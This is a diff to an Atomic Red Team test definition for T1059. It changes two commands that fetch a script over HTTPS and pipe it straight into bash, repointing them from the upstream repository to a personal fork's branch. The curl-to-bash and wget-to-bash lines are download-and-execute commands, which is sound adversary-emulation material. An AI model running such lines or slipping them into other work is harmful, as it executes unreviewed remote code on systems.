@@ -16,7 +16,7 @@ atomic_tests:
   executor:
     name: sh
     command: |
-      curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
-      wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
+      curl -sS https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1059/echo-art-fish.sh | bash
+      wget --quiet -O - https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1059/echo-art-fish.sh | bash
     cleanup_command: |
       rm /tmp/art-fish.txt
